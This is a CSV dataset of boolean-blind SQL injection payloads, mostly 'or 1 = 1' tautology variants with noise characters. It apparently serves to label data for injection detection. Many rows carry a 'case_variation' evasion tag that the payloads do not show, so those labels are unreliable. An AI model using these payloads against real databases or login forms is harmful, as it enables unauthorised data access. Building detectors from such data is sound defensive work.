payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
""" or 1 = 1--",boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
' or 1 = 1 /*,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
or 1 = 1--,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
' ) or ( 'a' = 'a,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
' or 'unusual' = 'unusual',boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
' or 'something' = 'some'+'thing',boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
' or 'something' like 'some%',boolean_blind,unknown,function_alternative,0.8,rule,sqliv5_csv,unknown
select * from users where id = 1 or ( \+ ) = 1 or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 or ( $+ ) = 1 or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 or \.<\ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 or \.<1 or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 or \.<$ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 or \+<\ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 or $<\ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 or $<\. or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 or $+<\ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 or \<\. or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 or \<1 or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 or \<$ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 or \< = 1 or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 or !<@ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 + ( \ ) or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1. or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 + ( \. ) or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1. <@ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1.<@. or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1.*1 or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1.<@$ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1.%@ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 +1 or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 + ( 1 ) or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 + ( \+ ) or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 + \+%\ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 + \+%1 or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 + \+%$ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 +$ . or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 +$ 1 or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 +$+ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 + ( $+ ) or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 +$+. or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 + $+%\ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 + $+%1 or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 + $+%$ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 <@ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 % ( \ ) or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 % ( 1 ) or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 % ( $ ) or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 % ( @ ) or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 <@. or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 <@.. or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 <@.$ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 *1 or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 <@1$ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 <@$ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 %$ . or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 %$ 1 or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 <@$_ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 <@<@ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 %!<1 or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 %!<@ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = 1 &@ or 1 = 1 -- 1,boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = '1' or \.<\ or 1 = 1 -- 1',boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = '1' or 1 = 1 -- 1',boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1',boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = '1' or $<\ or 1 = 1 -- 1',boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = '1' or \<\. or 1 = 1 -- 1',boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = '1' or \<1 or 1 = 1 -- 1',boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = '1' or \<$ or 1 = 1 -- 1',boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = '1' or !<@ or 1 = 1 -- 1',boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ( ) "" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ( ,"" = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ( ."" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ( 1"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ( ;"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ( ]"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ( #"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ( ["" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ( _"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or @#"" ( = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ( &"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ( @"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ( {"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ) ( "" = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ) ,"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ) ."" = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ) 1"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ) ;"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ) ]"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ) ["" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ) $"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ) @"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "" ) {"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "", ( "" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "", ) "" = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "",,"" = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "",."" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "",;"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "",?"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "",#"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#"", = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "",&"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "",{"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "". ( "" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "". ) "" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "".,"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "".."" = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "".;"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "".]"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "".#"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "".["" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""._"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or @#"". = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "".%"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "".@"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "".{"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""1 ( "" = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""1 ) "" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""1,"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""1;"" = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""1]"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""1#"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""1["" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""1_"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""1&"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""1{"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""; or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""; ( "" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""; ) "" = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "";,"" = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "";."" = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "";1"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "";]"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "";#"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "";["" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "";_"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or @#""; = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "";&"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "";@"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or "";{"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""? or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""? ( "" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""] ) "" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""?,"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""]."" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""]1"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""?;"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""??"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""?#"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""?["" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""?_"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""? = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""?%"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""?@"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""]{"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""\#"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""$ ( "" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""_ ) "" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""_;"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""$?"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""$#"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""$["" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""$_"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""$&"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""$@"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""_{"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = '1' * ( \ ) or 1 = 1 -- 1',boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
